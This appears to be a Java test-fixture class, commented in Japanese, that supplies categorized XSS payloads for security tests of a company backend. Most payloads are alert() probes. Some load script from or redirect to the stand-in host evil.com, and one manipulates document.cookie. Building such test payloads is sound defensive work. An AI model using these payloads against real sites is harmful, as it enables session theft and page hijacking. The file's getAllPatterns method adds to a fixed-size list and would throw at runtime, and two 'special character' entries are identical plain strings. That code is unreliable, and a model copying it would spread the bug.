package com.example.companybackend.security.test.xss;

import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.HashMap;

/**
 * XSS攻撃パターンファクトリー
 * 
 * 目的:
 * - 様々なXSS攻撃パターンを生成・管理
 * - テストケースで使用する攻撃ペイロードの提供
 * - 攻撃パターンの分類・整理
 * - 新しい攻撃手法への対応
 * 
 * 機能:
 * - スクリプトタグベースの攻撃パターン
 * - イベントハンドラーベースの攻撃パターン
 * - JavaScript URLベースの攻撃パターン
 * - HTMLエンティティエンコーディング回避攻撃
 * - 複合攻撃パターン
 */
public class XssAttackPatternFactory {

    /**
     * 基本的なスクリプトタグ攻撃パターン
     */
    public static List<String> getBasicScriptTagPatterns() {
        return Arrays.asList(
                "<script>alert('XSS')</script>",
                "<script>alert(\"XSS\")</script>",
                "<script>alert(`XSS`)</script>",
                "<script>confirm('XSS')</script>",
                "<script>prompt('XSS')</script>",
                "<script>console.log('XSS')</script>",
                "<script>document.write('XSS')</script>",
                "<script>window.location='http://evil.com'</script>",
                "<script>document.cookie='stolen='+document.cookie</script>",
                "<script>eval('alert(\"XSS\")')</script>");
    }

    /**
     * 高度なスクリプトタグ攻撃パターン
     */
    public static List<String> getAdvancedScriptTagPatterns() {
        return Arrays.asList(
                "<script type=\"text/javascript\">alert('XSS')</script>",
                "<script language=\"javascript\">alert('XSS')</script>",
                "<script src=\"http://evil.com/xss.js\"></script>",
                "<script>/**/alert('XSS')/**/ </script>",
                "<script>setTimeout('alert(\"XSS\")',1000)</script>",
                "<script>setInterval('alert(\"XSS\")',1000)</script>",
                "<script>Function('alert(\"XSS\")')();</script>",
                "<script>new Function('alert(\"XSS\")')();</script>",
                "<script>(function(){alert('XSS')})();</script>",
                "<script>with(document)write('<img src=x onerror=alert(1)>')</script>");
    }

    /**
     * イベントハンドラー攻撃パターン
     */
    public static List<String> getEventHandlerPatterns() {
        return Arrays.asList(
                "<img src='x' onerror='alert(\"XSS\")'>",
                "<img src='x' onload='alert(\"XSS\")'>",
                "<div onmouseover='alert(\"XSS\")'>Hover me</div>",
                "<div onclick='alert(\"XSS\")'>Click me</div>",
                "<input onfocus='alert(\"XSS\")' autofocus>",
                "<body onload='alert(\"XSS\")'>",
                "<iframe onload='alert(\"XSS\")'></iframe>",
                "<svg onload='alert(\"XSS\")'></svg>",
                "<video onerror='alert(\"XSS\")'><source></video>",
                "<audio onerror='alert(\"XSS\")'><source></audio>",
                "<object onerror='alert(\"XSS\")'></object>",
                "<embed onerror='alert(\"XSS\")'>",
                "<applet onerror='alert(\"XSS\")'></applet>",
                "<form onsubmit='alert(\"XSS\")'></form>",
                "<button onmousedown='alert(\"XSS\")'>Press me</button>");
    }

    /**
     * JavaScript URL攻撃パターン
     */
    public static List<String> getJavaScriptUrlPatterns() {
        return Arrays.asList(
                "javascript:alert('XSS')",
                "javascript:alert(\"XSS\")",
                "javascript:confirm('XSS')",
                "javascript:prompt('XSS')",
                "javascript:void(0);alert('XSS')",
                "javascript:eval('alert(\"XSS\")')",
                "javascript:setTimeout('alert(\"XSS\")',1000)",
                "javascript:window.location='http://evil.com'",
                "javascript:document.write('<script>alert(\"XSS\")</script>')",
                "javascript:with(document)write('<img src=x onerror=alert(1)>')");
    }

    /**
     * VBScript URL攻撃パターン
     */
    public static List<String> getVbScriptUrlPatterns() {
        return Arrays.asList(
                "vbscript:alert('XSS')",
                "vbscript:msgbox('XSS')",
                "vbscript:execute('alert(\"XSS\")')");
    }

    /**
     * Data URL攻撃パターン
     */
    public static List<String> getDataUrlPatterns() {
        return Arrays.asList(
                "data:text/html,<script>alert('XSS')</script>",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
                "data:text/javascript,alert('XSS')",
                "data:application/javascript,alert('XSS')",
                "data:text/html,<img src=x onerror=alert('XSS')>",
                "data:text/html,<iframe src=javascript:alert('XSS')></iframe>");
    }

    /**
     * HTMLエンティティエンコーディング回避攻撃パターン
     */
    public static List<String> getEncodingBypassPatterns() {
        return Arrays.asList(
                "&#60;script&#62;alert('XSS')&#60;/script&#62;",
                "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
                "&lt;script&gt;alert('XSS')&lt;/script&gt;",
                "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
                "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
                "%3Cscript%3Ealert('XSS')%3C/script%3E",
                "\\074script\\076alert('XSS')\\074/script\\076");
    }

    /**
     * CSS攻撃パターン
     */
    public static List<String> getCssAttackPatterns() {
        return Arrays.asList(
                "<style>body{background:url('javascript:alert(\"XSS\")')}</style>",
                "<div style=\"background:url('javascript:alert(\\\"XSS\\\")')\">",
                "<div style=\"width:expression(alert('XSS'))\">",
                "<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">",
                "<style>@import 'javascript:alert(\"XSS\")';</style>",
                "<div style=\"-moz-binding:url('http://evil.com/xss.xml#xss')\">",
                "<style>body{-webkit-transform:rotate(0deg);}</style><script>alert('XSS')</script>");
    }

    /**
     * SVG攻撃パターン
     */
    public static List<String> getSvgAttackPatterns() {
        return Arrays.asList(
                "<svg onload='alert(\"XSS\")'></svg>",
                "<svg><script>alert('XSS')</script></svg>",
                "<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>",
                "<svg><use href=\"#x\" onload=\"alert('XSS')\"></use></svg>",
                "<svg><animate onbegin=\"alert('XSS')\"></animate></svg>",
                "<svg><set onbegin=\"alert('XSS')\"></set></svg>",
                "<svg><animateTransform onbegin=\"alert('XSS')\"></animateTransform></svg>");
    }

    /**
     * フォーム攻撃パターン
     */
    public static List<String> getFormAttackPatterns() {
        return Arrays.asList(
                "<form action=\"javascript:alert('XSS')\">",
                "<input type=\"text\" value=\"\" onfocus=\"alert('XSS')\" autofocus>",
                "<textarea onfocus=\"alert('XSS')\" autofocus></textarea>",
                "<select onfocus=\"alert('XSS')\" autofocus><option>test</option></select>",
                "<button onclick=\"alert('XSS')\">Click me</button>",
                "<input type=\"image\" src=\"x\" onerror=\"alert('XSS')\">",
                "<input type=\"submit\" formaction=\"javascript:alert('XSS')\">");
    }

    /**
     * 複合攻撃パターン
     */
    public static List<String> getCombinedAttackPatterns() {
        return Arrays.asList(
                "<script>alert('XSS')</script><img src='x' onerror='alert(\"XSS2\")'>",
                "<div onmouseover='alert(\"XSS1\")'><script>alert('XSS2')</script></div>",
                "javascript:alert('XSS1');<script>alert('XSS2')</script>",
                "<svg onload='alert(\"XSS1\")'><script>alert('XSS2')</script></svg>",
                "<iframe src='javascript:alert(\"XSS1\")'></iframe><script>alert('XSS2')</script>");
    }

    /**
     * コンテキスト別攻撃パターンマップ
     */
    public static Map<String, List<String>> getContextBasedPatterns() {
        Map<String, List<String>> patterns = new HashMap<>();

        patterns.put("HTML_CONTENT", getBasicScriptTagPatterns());
        patterns.put("HTML_ATTRIBUTE", getEventHandlerPatterns());
        patterns.put("URL_CONTEXT", getJavaScriptUrlPatterns());
        patterns.put("CSS_CONTEXT", getCssAttackPatterns());
        patterns.put("JAVASCRIPT_CONTEXT", Arrays.asList(
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "';alert('XSS');var dummy='",
                "\";alert('XSS');var dummy=\""));
        patterns.put("JSON_CONTEXT", Arrays.asList(
                "\"}; alert('XSS'); var dummy={\"key\":\"",
                "\"]; alert('XSS'); var dummy=[\"",
                "\", \"xss\": \"<script>alert('XSS')</script>\", \"dummy\": \""));

        return patterns;
    }

    /**
     * フィルター回避攻撃パターン
     */
    public static List<String> getFilterBypassPatterns() {
        return Arrays.asList(
                // 大文字小文字混在
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<SCRIPT>alert('XSS')</SCRIPT>",
                "<Script>alert('XSS')</Script>",

                // 空白文字挿入
                "<script >alert('XSS')</script>",
                "<script\t>alert('XSS')</script>",
                "<script\n>alert('XSS')</script>",
                "<script\r>alert('XSS')</script>",

                // NULL文字挿入
                "<script\0>alert('XSS')</script>",

                // コメント挿入
                "<script>/**/alert('XSS')/**/</script>",
                "<script><!-- -->alert('XSS')<!-- --></script>",

                // 文字列分割
                "<scr' + 'ipt>alert('XSS')</scr' + 'ipt>",
                "<scr\"+\"ipt>alert('XSS')</scr\"+\"ipt>",

                // 改行・タブ文字
                "<script>\nalert('XSS')\n</script>",
                "<script>\talert('XSS')\t</script>",

                // 特殊文字
                "<script>alert('XSS')</script>",
                "<script>alert('XSS')</script>");
    }

    /**
     * ブラウザ固有攻撃パターン
     */
    public static Map<String, List<String>> getBrowserSpecificPatterns() {
        Map<String, List<String>> patterns = new HashMap<>();

        // Internet Explorer固有
        patterns.put("IE", Arrays.asList(
                "<div style=\"width:expression(alert('XSS'))\">",
                "<xml><i><b>&lt;img src=1 onerror=alert('XSS')&gt;</b></i></xml>",
                "<comment><img src=x onerror=alert('XSS')></comment>",
                "<!--[if IE]><script>alert('XSS')</script><![endif]-->"));

        // Firefox固有
        patterns.put("FIREFOX", Arrays.asList(
                "<div style=\"-moz-binding:url('http://evil.com/xss.xml#xss')\">",
                "<xss:script xmlns:xss=\"http://www.w3.org/1999/xhtml\">alert('XSS')</xss:script>"));

        // Chrome/Safari固有
        patterns.put("WEBKIT", Arrays.asList(
                "<div style=\"-webkit-transform:rotate(0deg);background:url('javascript:alert(\\\"XSS\\\")')\">",
                "<iframe src=\"data:text/html,<script>parent.alert('XSS')</script>\"></iframe>"));

        return patterns;
    }

    /**
     * 攻撃パターンの重要度分類
     */
    public static Map<String, List<String>> getPatternsByPriority() {
        Map<String, List<String>> patterns = new HashMap<>();

        // 高優先度（最も一般的で危険）
        patterns.put("HIGH", Arrays.asList(
                "<script>alert('XSS')</script>",
                "<img src='x' onerror='alert(\"XSS\")'>",
                "javascript:alert('XSS')",
                "<svg onload='alert(\"XSS\")'></svg>"));

        // 中優先度（一般的）
        patterns.put("MEDIUM", Arrays.asList(
                "<div onmouseover='alert(\"XSS\")'>Hover me</div>",
                "<iframe src='javascript:alert(\"XSS\")'></iframe>",
                "<form action=\"javascript:alert('XSS')\">",
                "data:text/html,<script>alert('XSS')</script>"));

        // 低優先度（特殊なケース）
        patterns.put("LOW", Arrays.asList(
                "<style>body{background:url('javascript:alert(\"XSS\")')}</style>",
                "vbscript:alert('XSS')",
                "&#60;script&#62;alert('XSS')&#60;/script&#62;",
                "<comment><img src=x onerror=alert('XSS')></comment>"));

        return patterns;
    }

    /**
     * 全攻撃パターンを取得
     */
    public static List<String> getAllPatterns() {
        List<String> allPatterns = Arrays.asList();
        allPatterns.addAll(getBasicScriptTagPatterns());
        allPatterns.addAll(getAdvancedScriptTagPatterns());
        allPatterns.addAll(getEventHandlerPatterns());
        allPatterns.addAll(getJavaScriptUrlPatterns());
        allPatterns.addAll(getVbScriptUrlPatterns());
        allPatterns.addAll(getDataUrlPatterns());
        allPatterns.addAll(getEncodingBypassPatterns());
        allPatterns.addAll(getCssAttackPatterns());
        allPatterns.addAll(getSvgAttackPatterns());
        allPatterns.addAll(getFormAttackPatterns());
        allPatterns.addAll(getCombinedAttackPatterns());
        allPatterns.addAll(getFilterBypassPatterns());

        return allPatterns;
    }

    /**
     * ランダムな攻撃パターンを取得
     */
    public static String getRandomPattern() {
        List<String> allPatterns = getAllPatterns();
        int randomIndex = (int) (Math.random() * allPatterns.size());
        return allPatterns.get(randomIndex);
    }

    /**
     * 指定されたカテゴリの攻撃パターンを取得
     */
    public static List<String> getPatternsByCategory(String category) {
        switch (category.toUpperCase()) {
            case "SCRIPT":
                return getBasicScriptTagPatterns();
            case "EVENT":
                return getEventHandlerPatterns();
            case "URL":
                return getJavaScriptUrlPatterns();
            case "CSS":
                return getCssAttackPatterns();
            case "SVG":
                return getSvgAttackPatterns();
            case "FORM":
                return getFormAttackPatterns();
            case "BYPASS":
                return getFilterBypassPatterns();
            case "COMBINED":
                return getCombinedAttackPatterns();
            default:
                return getAllPatterns();
        }
    }
}